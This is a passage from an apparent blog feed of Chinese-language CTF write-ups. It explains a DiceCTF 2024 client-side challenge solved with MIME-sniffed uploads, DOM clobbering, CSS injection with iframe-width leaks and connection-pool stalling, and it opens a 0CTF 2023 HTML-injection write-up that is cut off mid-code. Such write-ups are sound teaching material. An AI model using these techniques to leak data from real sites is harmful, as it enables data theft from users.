的檔案，在舊版的 fastify static 中就不會有 mimetype，這題也沒有禁止 mime sniffing，就能上傳 HTML 或是 CSS 檔案。</p><p>順帶一提，這一題的 CSP 如下：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">fastify<span class="token punctuation">.</span><span class="token function">addHook</span><span class="token punctuation">(</span><span class="token string">'onRequest'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res<span class="token punctuation">,</span> done</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> users<span class="token punctuation">.</span><span class="token function">has</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        req<span class="token punctuation">.</span>user <span class="token operator">=</span> users<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>req<span class="token punctuation">.</span>session<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">"username"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    res<span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Content-Security-Policy"</span><span class="token punctuation">,</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">        script-src 'sha256-BCut0I6hAnpHxUpwpaDB1crwgr249r2udW3tkBGQLv4=' 'unsafe-inline';        img-src 'self';        style-src 'self' 'unsafe-inline' https://fonts.googleapis.com/css2;        font-src https://fonts.gstatic.com/s/inter/;        frame-ancestors 'none';        object-src 'none';        base-uri 'none';    </span><span class="token template-punctuation string">`</span></span><span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\s+</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Cache-Control"</span><span class="token punctuation">,</span> <span class="token string">"no-cache, no-store"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"X-Frame-Options"</span><span class="token punctuation">,</span> <span class="token string">"DENY"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">done</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>雖然說乍看之下 script-src 有 unsafe-inline，但其實是沒作用的，嘗試了之後會發現底下錯誤：</p><pre class="line-numbers language-none"><code class="language-none">refused to execute inline script because it violates the following Content Security Policy directive:&quot;script-src &#39;sha256-BCut0I6hAnpHxUpwpaDB1crwgr249r2udW3tkBGQLv4&#x3D;&#39; &#39;unsafe-inline&#39;&quot;. Note that &#39;unsafe-inline&#39; is ignored if either a hash or nonce value is present in the source list.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因此這題可以用的 JavaScript 只有題目原先給的而已，其他都要靠 CSS 搞定。</p><p>利用以前作者出過的另外一題的技巧，可以藉由 dom clobbering defaultView 來決定 client router 要 render 哪一頁，就等於是可以在任意頁面注入 HTML 跟 CSS，細節可以參考我寫過的：<a href="https://blog.huli.tw/2022/08/21/en/corctf-2022-modern-blog-writeup/">corCTF 2022 writeup - modernblog</a>。</p><p>我們需要先得到 <code>/home</code> 裡面會出現的 post id，再得到 <code>/view/:id</code> 裡面會出現的圖片路徑，就能取得 flag。這個 post id 的長度有 16 位，每一位都是 0-f，更麻煩的是這個 post id 每一次請求都會更新：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript">fastify<span class="token punctuation">.</span><span class="token function">route</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>    <span class="token literal-property property">method</span><span class="token operator">:</span> <span class="token string">'GET'</span><span class="token punctuation">,</span>    <span class="token literal-property property">path</span><span class="token operator">:</span> <span class="token string">'/api/pastes'</span><span class="token punctuation">,</span>    <span class="token literal-property property">onRequest</span><span class="token operator">:</span> requiresLogin<span class="token punctuation">,</span>    <span class="token function-variable function">handler</span><span class="token operator">:</span> <span class="token punctuation">(</span><span class="token parameter">req<span class="token punctuation">,</span> res</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>        req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>pastes<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token parameter">p</span> <span class="token operator">=></span> p<span class="token punctuation">.</span>id <span class="token operator">=</span> crypto<span class="token punctuation">.</span><span class="token function">randomBytes</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">toString</span><span class="token punctuation">(</span><span class="token string">"hex"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> req<span class="token punctuation">.</span>user<span class="token punctuation">.</span>pastes<span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter"><span class="token punctuation">&#123;</span> id<span class="token punctuation">,</span> title <span class="token punctuation">&#125;</span></span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span><span class="token punctuation">&#123;</span> id<span class="token punctuation">,</span> title <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>作者給的解法是運用 CSS + iframe 來 leak 出頁面上的資訊，如果只是洩露出一位很簡單，可以利用長寬來做，像是：</p><pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span><span class="token style"><span class="token language-css">  <span class="token selector">body:has(a[href^="/view/1"]) iframe</span> <span class="token punctuation">&#123;</span>    <span class="token property">width</span><span class="token punctuation">:</span> 1px<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token selector">body:has(a[href^="/view/2"]) iframe</span> <span class="token punctuation">&#123;</span>    <span class="token property">width</span><span class="token punctuation">:</span> 2px<span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>因為這邊 CSP 並沒有 frame-src，所以這個 iframe 會是我們的 origin，可以用 <code>window.innerWidth</code> 來得到寬度，藉此知道第一個字元是什麼。</p><p>但問題是每次請求都會不一樣，所以我們必須在一次之內得到所有字元，否則 id 就不同了。</p><p>如果要一次 leak 出這麼多字元，一種方式是使用之前在 <a href="https://blog.huli.tw/2023/12/11/0ctf-2023-writeup/">0CTF 2023</a> 中才提過的方式，另一種是 recursive import，但這種通常都需要有自己的 server 配合。</p><p>而作者則是利用了 connection pool 的上限解掉了後者的問題，connection pool 在 CTF 中出現的頻率不低，簡單來說就是把 Chromium 的 255 個 connection 都填滿，就能控制下一個資源什麼時候載入。</p><p>因此做法是：</p><ol><li>先引入第一個 style（假設叫做 <code>.jpg</code>），裡面會 leak 出第一個字元並且 import <code>.png</code></li><li>此時在我們的網頁把 connection 填滿，直到 leak 出第一個字並且上傳新的 style 檔案後才釋放</li><li>不斷重複以上做法</li></ol><p>概念是應該是這樣，但實作上似乎有許多狀況需要考慮，會複雜許多，可以參考最後會附上的作者解法，裡面有更多細節。</p><p>leak 出 id 以後，接著就可以如法炮製，把圖片路徑也 leak 出來。</p><p>但重點是 view note 的頁面，會自動發送請求把圖片刪除，出現錯誤的話也會跳出 <code>alert</code>：</p><pre class="line-numbers language-jsx" data-language="jsx"><code class="language-jsx"><span class="token keyword">import</span> React <span class="token keyword">from</span> <span class="token string">"react"</span><span class="token punctuation">;</span><span class="token keyword">import</span> <span class="token punctuation">&#123;</span> Link<span class="token punctuation">,</span> useParams<span class="token punctuation">,</span> useNavigate <span class="token punctuation">&#125;</span> <span class="token keyword">from</span> <span class="token string">"react-router-dom"</span><span class="token punctuation">;</span><span class="token keyword">import</span> axios <span class="token keyword">from</span> <span class="token string">'axios'</span><span class="token punctuation">;</span><span class="token keyword">export</span> <span class="token keyword">default</span> <span class="token keyword">function</span> <span class="token function">View</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> <span class="token punctuation">&#123;</span> id <span class="token punctuation">&#125;</span> <span class="token operator">=</span> <span class="token function">useParams</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> navigate <span class="token operator">=</span> <span class="token function">useNavigate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token punctuation">[</span>paste<span class="token punctuation">,</span> setPaste<span class="token punctuation">]</span> <span class="token operator">=</span> React<span class="token punctuation">.</span><span class="token function">useState</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  React<span class="token punctuation">.</span><span class="token function">useEffect</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">(</span><span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">const</span> r <span class="token operator">=</span> <span class="token keyword">await</span> axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/api/paste/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>r<span class="token punctuation">.</span>data<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>          <span class="token function">setPaste</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>data<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>r<span class="token punctuation">.</span>data<span class="token punctuation">.</span>image<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token keyword">await</span> <span class="token function">deletePaste</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>data<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">;</span>          <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token operator">?.</span>response<span class="token operator">?.</span>data<span class="token operator">?.</span>message <span class="token operator">||</span> e<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">navigate</span><span class="token punctuation">(</span><span class="token string">"/home"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> <span class="token function-variable function">deletePaste</span> <span class="token operator">=</span> <span class="token keyword">async</span> <span class="token punctuation">(</span><span class="token parameter">id</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>      <span class="token keyword">await</span> axios<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/api/destroy/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>      <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token operator">?.</span>response<span class="token operator">?.</span>data<span class="token operator">?.</span>message <span class="token operator">||</span> e<span class="token punctuation">.</span>message<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">navigate</span><span class="token punctuation">(</span><span class="token string">"/home"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>paste<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> <span class="token punctuation">(</span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span></span><span class="token punctuation">></span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h3</span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>paste<span class="token punctuation">.</span>title<span class="token punctuation">&#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h3</span><span class="token punctuation">></span></span><span class="token plain-text">      </span><span class="token punctuation">&#123;</span> paste<span class="token punctuation">.</span>image <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/uploads/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>paste<span class="token punctuation">.</span>image<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">&#125;</span></span> <span class="token attr-name">onLoad</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">deletePaste</span><span class="token punctuation">(</span>paste<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span> <span class="token attr-name">onError</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token function">deletePaste</span><span class="token punctuation">(</span>paste<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mw-100<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span>      <span class="token punctuation">)</span><span class="token punctuation">&#125;</span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">style</span><span class="token script language-javascript"><span class="token script-punctuation punctuation">=</span><span class="token punctuation">&#123;</span><span class="token punctuation">&#123;</span> <span class="token literal-property property">whiteSpace</span><span class="token operator">:</span> <span class="token string">"pre-line"</span> <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span> <span class="token attr-name">className</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>mb-2<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token punctuation">&#123;</span>paste<span class="token punctuation">.</span>text<span class="token punctuation">&#125;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token plain-text">      </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span><span class="token class-name">Link</span></span> <span class="token attr-name">to</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/home<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token plain-text">← Back</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span><span class="token class-name">Link</span></span><span class="token punctuation">></span></span><span class="token plain-text">    </span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span></span><span class="token punctuation">></span></span>  <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>可以用 meta tag 的 CSP connect-src 阻止刪除圖片的請求，並且用 iframe 的 sandbox 阻止跳出 modal。</p><p>不過我覺得這題最難的事情是要在 30 秒內把所有事情做完，等於說每一個環節都必須自動化，這個真的難。</p><p>底下附上作者 strellic 的解法，上面是參考他的解法寫的：</p><ol><li>uploading files as .png or .jpg have no mimetype (old version of fastify static) so they are mime sniffed (no xcto) and you can upload arb html &#x2F; css</li><li>use technique from modernblog (clobber defaultView) and upload arb html that react router thinks is a target path. this lets us add custom html onto any page of the react app we want</li><li>now, we need to leak both the flag post id and username. we do this with css injection and iframes</li><li>we can use css to change the width&#x2F;height of an iframe, and since there is no frame-src, we can point it to our own domain and read these values</li><li>i use window.open to get a window ref, then reading w.frames[0].innerWidth repeatedly</li><li>the only issue is, how do we leak the entire id if on every refresh the post ids change?</li><li>lets use the classic css recursive import (with a twist)</li><li>the issue with recursive import is that you need to import from a server you control. you need this bc you need the next css file request to stop responding until you leak the previous data so you know what css to send. but style-src is self, so we cant stall the next css file - or can we?</li><li>my solution: lets abuse the connection pool! if we  block every socket on another tab, we can stop the css from importing until we are ready, and we unblock and reblock the socket pool at will</li><li>this allows us to control the time at which the next css file is uploaded, essentially letting us recreate the recursive css technique even when we dont control the target server!</li><li>this is a little complicated, we need to remove type module from script tag so it doesnt block, as well as move it to body. in addition we have to start the initial css req in a style tag (which is why unsafe-inline is there), otherwise it blocks</li><li>we also need to create a “buffer” of empty css files that just request another one so we can account for the initial api requests (as they happen in tandem with the css requests)</li><li>with this you can leak the post id</li><li>now to leak the username, you do the same technique but need to stop the image from deleting</li><li>use a csp meta tag with connect src to stop it from requesting the destroy endpoint</li><li>but this causes an alert which blocks everything, so you put this in an iframe srcdoc that doesnt allow modals</li><li>do all of this in 30 seconds and you can get the flag! (my solve finishes in 25s with no optimization)</li></ol><h2><span id="後記">後記</span></h2><p>最近有其他事情在忙，有段時間沒打 CTF 了，總覺得有點生疏，不過把 safestlist 解掉真的滿開心的，代表身手沒有退步太多XD</p><p>除此之外，這篇也是相隔了兩個月之後的更新，是 2024 年的第一篇，雖然有點晚了，不過還是祝各位讀者新年快樂。</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;相比於&lt;a href=&quot;https://blog.huli.tw/2023/03/26/dicectf-2023-writeup/&quot;&gt;去年&lt;/a&gt;跟&lt;a href=&quot;https://blog.huli.tw/2022/02/08/what-i-learned-from-dicectf-2022/&quot;&gt;前年&lt;/a&gt;，今年的 web 題難度有顯著降低了不少，變得更平易近人了，靠著隊友的努力拿下了第一名，而 web 題也只剩一題沒解出來。&lt;/p&gt;
&lt;p&gt;這次我基本上只解了簡單的 funnylogin 跟難的 safestlist，其他都是隊友解開的，還有另一題 another-csp 有看了一下，因此這篇只會記我有看過的以及比較難的題目。&lt;/p&gt;
&lt;p&gt;如果想看其他題，可以參考其他人的 writeup：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&quot;https://nanimokangaeteinai.hateblo.jp/entry/2024/02/06/051003&quot;&gt;st98 - DiceCTF 2024 Quals writeup&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://one3147.tistory.com/77&quot;&gt;0xOne - 2024 Dice CTF Write up [Web]&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;官方提供的所有題目原始碼：&lt;a href=&quot;https://github.com/dicegang/dicectf-quals-2024-challenges&quot;&gt;https://github.com/dicegang/dicectf-quals-2024-challenges&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;關鍵字列表：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;crash chromium&lt;/li&gt;
&lt;li&gt;slower css style&lt;/li&gt;
&lt;li&gt;xsleak&lt;/li&gt;
&lt;li&gt;URL length limit&lt;/li&gt;
&lt;li&gt;service worker&lt;/li&gt;
&lt;li&gt;background fetch&lt;/li&gt;
&lt;li&gt;connection pool + css injection&lt;/li&gt;
&lt;li&gt;iframe width + css inection&lt;/li&gt;
&lt;/ol&gt;</summary>
    
    
    
    <category term="Security" scheme="https://blog.huli.tw/categories/Security/"/>
    
    
    <category term="Security" scheme="https://blog.huli.tw/tags/Security/"/>
    
  </entry>
  
  
  
  <entry>
    <title>0CTF 2023 筆記</title>
    <link href="https://blog.huli.tw/2023/12/11/0ctf-2023-writeup/"/>
    <id>https://blog.huli.tw/2023/12/11/0ctf-2023-writeup/</id>
    <published>2023-12-11T04:40:00.000Z</published>
    <updated>2024-02-18T05:46:38.102Z</updated>
    
    <content type="html"><![CDATA[<p>今年的 0CTF 一共有三道 web 題，其中一道題目是 client-side 的，我就只解這題而已，順利拿到 first blood，這篇簡單記錄一下心得。</p><p>關鍵字列表：</p><ol><li>CSS injection</li><li>CSS exfiltration</li></ol><span id="more"></span><h2><span id="web-newdiary-14-solves">Web - newdiary (14 solves)</span></h2><p>題目就是個典型的 note app，可以建立筆記然後回報給 admin bot，筆記只有限制長度，並沒有做過濾，在 client 也是直接用 innerHTML，所以很明顯有 HTML injection：</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token function-variable function">load</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"title"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">""</span>    document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">""</span>    <span class="token keyword">const</span> param <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">URLSearchParams</span><span class="token punctuation">(</span>location<span class="token punctuation">.</span>hash<span class="token punctuation">.</span><span class="token function">slice</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">const</span> id <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'id'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> username <span class="token operator">=</span> param<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token string">'username'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>id <span class="token operator">&amp;&amp;</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">^[0-9a-f]+$</span><span class="token regex-delimiter">/</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>id<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>username <span class="token operator">===</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/share/read/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> data<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                <span class="token keyword">const</span> title <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                title<span class="token punctuation">.</span>innerText <span class="token operator">=</span> data<span class="token punctuation">.</span>title<span class="token punctuation">;</span>                document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"title"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>title<span class="token punctuation">)</span><span class="token punctuation">;</span>                        <span class="token keyword">const</span> content <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                content<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> data<span class="token punctuation">.</span>content<span class="token punctuation">;</span>                document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>        <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>            <span class="token function">fetch</span><span class="token punctuation">(</span><span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">/share/read/</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>id<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">?username=</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>username<span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token template-punctuation string">`</span></span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> data<span class="token punctuation">.</span><span class="token function">json</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token parameter">data</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>                <span class="token keyword">const</span> title <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                title<span class="token punctuation">.</span>innerText <span class="token operator">=</span> data<span class="token punctuation">.</span>title<span class="token punctuation">;</span>                document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"title"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>title<span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token keyword">const</span> content <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'p'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                content<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> data<span class="token punctuation">.</span>content<span class="token punctuation">;</span>                document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"content"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span 